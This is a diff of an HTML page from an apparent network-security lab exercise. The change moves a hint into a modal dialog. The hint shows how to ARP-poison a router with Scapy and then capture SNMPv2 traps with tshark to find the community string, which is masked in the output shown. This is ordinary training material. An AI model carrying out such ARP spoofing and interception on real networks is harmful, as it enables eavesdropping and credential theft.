@@ -232,38 +232,61 @@ line vty 0 4
 
 <p>Using&nbsp;<tt>tshark</tt>&nbsp;or&nbsp;<a class="http" href="http://wiresharkdownloads.riverbed.com/video/wireshark/introduction-to-wireshark/">Wireshark</a>, discover the SNMPv2 community string used in Traps sent to&nbsp;<strong>windows.seccon.ninja</strong>. The Get/Set community string uses the same password.  Use ARP cache poisoning against the router to send the SNMPv2 trap to your kali box instead of windows.</p>
 
-<p><b>Omar:  Below is a cheat, can you please adapt?</b></p>
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<a target="blank" data-toggle="modal" data-target="#Hint11" href="#">+ Click here for Hint</a>
+<div class="modal fade" id="Hint11" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Hint </h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
 
-<pre>
-  root@bah-pod1-kali:~# <strong> host windows.seccon.ninja</strong>
-  windows.seccon.ninja has address 192.168.1.4
-  root@bah-pod1-kali:~# <strong> scapy</strong>
-  Welcome to Scapy (2.2.0)
-  >>> arpcachepoison('192.168.1.1','192.168.1.4')
-  .
-  Sent 1 packets.
-  .^Z
-  [1]+  Stopped                 sudo scapy
+      <pre>
+        root@bah-pod1-kali:~# <strong> host windows.seccon.ninja</strong>
+        windows.seccon.ninja has address 192.168.1.4
+        root@bah-pod1-kali:~# <strong> scapy</strong>
+        Welcome to Scapy (2.2.0)
+        >>> arpcachepoison('192.168.1.1','192.168.1.4')
+        .
+        Sent 1 packets.
+        .^Z
+        [1]+  Stopped                 sudo scapy
 
 
-  root@bah-pod1-kali:~# <strong> bg</strong>
-  [1]+ sudo scapy &
+        root@bah-pod1-kali:~# <strong> bg</strong>
+        [1]+ sudo scapy &
 
-  root@bah-pod1-kali:~# <strong> tshark -i eth1 -V udp port 162</strong>
-  Capturing on 'eth1'
-  Frame 1: 443 bytes on wire (3544 bits), 443 bytes captured (3544 bits) on interface 0
-  ...
-  Simple Network Management Protocol
-      version: v2c (1)
-      community: *****
-      data: snmpV2-trap (7)
-          snmpV2-trap
-              request-id: 5114
-              error-status: noError (0)
-              error-index: 0
-              variable-bindings: 15 items
-  ...
-</pre>
+        root@bah-pod1-kali:~# <strong> tshark -i eth1 -V udp port 162</strong>
+        Capturing on 'eth1'
+        Frame 1: 443 bytes on wire (3544 bits), 443 bytes captured (3544 bits) on interface 0
+        ...
+        Simple Network Management Protocol
+            version: v2c (1)
+            community: *****
+            data: snmpV2-trap (7)
+                snmpV2-trap
+                    request-id: 5114
+                    error-status: noError (0)
+                    error-index: 0
+                    variable-bindings: 15 items
+        ...
+      </pre>
+
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+      </div>
+    </div>
+</div>
+</div>
+
+<!--end hint -->
+
+
 
 
 <h3>Task 2</h3>
